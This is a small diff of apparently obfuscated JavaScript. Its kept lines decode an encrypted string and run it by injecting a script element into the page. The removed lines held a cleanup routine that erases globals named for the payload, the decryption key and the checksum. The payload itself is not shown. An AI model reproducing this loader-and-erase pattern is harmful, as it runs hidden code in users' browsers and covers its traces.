@@ -25,22 +25,3 @@
  const code=new TextDecoder().decode(dec);
  const s=document.createElement('script');s.text=code;document.body.appendChild(s);
 }catch(e){console.error(e);alert("Lỗi: "+e);}})();
-
-(function cleanup() {
-    const trash = [
-        "__NAZ_PAYLOAD",
-        "__NAZ_DECRYPTED",
-        "__NAZ_CHECKSUM",
-        "__NAZ_KEY",
-        "__NAZ_BUFFER",
-        "__NAZ_TMP"
-    ];
-    for (const k of trash) {
-        try {
-            if (window[k] !== undefined) {
-                window[k] = undefined;
-                delete window[k];
-            }
-        } catch (e) {}
-    }
-})();
